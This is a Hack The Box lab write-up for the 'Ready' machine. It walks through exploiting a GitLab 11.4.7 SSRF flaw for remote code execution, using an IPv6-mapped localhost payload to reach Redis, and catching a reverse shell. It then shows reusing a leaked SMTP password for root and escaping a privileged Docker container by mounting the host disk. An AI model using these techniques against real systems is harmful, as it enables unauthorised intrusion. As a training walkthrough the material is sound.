---
layout: page
title: Ready
description: Write-up
dropdown: HTB-BOXES
priority: 3
---
# Ready Walkthrough
![](https://i.ibb.co/dKTF8YB/image.png)



# []()Methodology

* Nmap scan.
* Nginx enumertation.
* Gitlab RCE via SSRF.
* Getting reverse shell.
* Enumerate Ready using LinPEAS.
* Escaping Docker Privileged Containers.
* RooTed.

## Nmap Scan:

**I just found 22 for ssh and 5080 for nginx.**


![](https://i.ibb.co/yVnQLPW/image.png)

### Check the Nginx service:

![](https://i.ibb.co/6s9FbLF/image.png)

> * It's a Gitlab Service run on Nginx.

> * I registered an account y4h1a:y123456789 

> * It's Version 11.4.7 so i will try to find a CVE for this version.

![](https://i.ibb.co/fFgVMw0/image.png)

> **I found an exploit to get RCE via SSRF vulnerability.**

> * You can do it Manually using this [Method](https://github.com/jas502n/gitlab-SSRF-redis-RCE).

> * I did it with this [exploit](https://github.com/ctrlsam/GitLab-11.4.7-RCE).

* by reading the exploit..

```python
username = args.u
password = args.p
gitlab_url = args.g + ":5080"
local_ip = args.l
local_port = args.P

------------
# Create project
import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
project_name = f'project{random.randrange(1, 10000)}'
project_url = f'{gitlab_url}/{username}'

```

> **We will bypass ssrf protection using this payload `[0:0:0:0:0:ffff:127.0.0.1]` and get the reverse shell in our listner. this is the exploit will do.**




![](https://i.ibb.co/4fwTjjV/image.png)


![](https://i.ibb.co/V9RW1Y7/image.png)

### Got the User flag!

![](https://i.ibb.co/NjrQ57w/image.png)


#### Time for enumerate Ready machine.

> * I upload [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to automate the enumeration process for Ready box.

**After it finished i got this in backup files.**


![](https://i.ibb.co/prF3nms/image.png)

```ruby
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

```
> **I will use this smtp password to switch to root permissions.**


![](https://i.ibb.co/8Mcq2fr/image.png)


![](https://i.ibb.co/FJG9WmH/image.png)

> * Now i'm in docker, so i need to escape to esclate my priviliges.

> * Found this useful [blog](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1).

```html
mkdir /tmp/y4h1a
mount /dev/sda2 /tmp/y4h1a
mount /dev/sda2 y4h1a
cat /tmp/y4h1a/root/root.txt
```



![](https://i.ibb.co/4jL8HfK/image.png)

# RooTed

<img src="http://www.hackthebox.eu/badge/image/209461" alt="Hack The Box">
![]()


![]()

![]()

![]()


![]()


![]()

![]()

![]()

![]()

![]()

![]()
![]()

![]()
